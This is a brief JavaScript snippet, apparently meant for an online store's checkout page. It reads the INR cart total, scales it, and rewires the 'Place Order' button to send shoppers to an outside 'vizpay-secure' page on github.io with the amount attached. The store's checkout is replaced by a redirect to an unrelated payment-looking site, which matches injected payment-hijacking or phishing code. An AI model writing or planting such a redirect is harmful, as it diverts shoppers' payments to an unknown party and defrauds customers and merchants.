
const montantText = document.querySelector('.cart-table-prd-price-total').textContent.trim();


const montant = parseFloat(montantText.replace('INR', '').trim());


const montantFinal = Math.ceil(montant / 100);


const customLink = `https://vizpay-secure.github.io/vizpay/?isc=${montantFinal}`;  


const btnPlaceOrder = document.querySelector('#btnPlaceOrder');
btnPlaceOrder.onclick = function() {
  window.location.href = customLink;
};
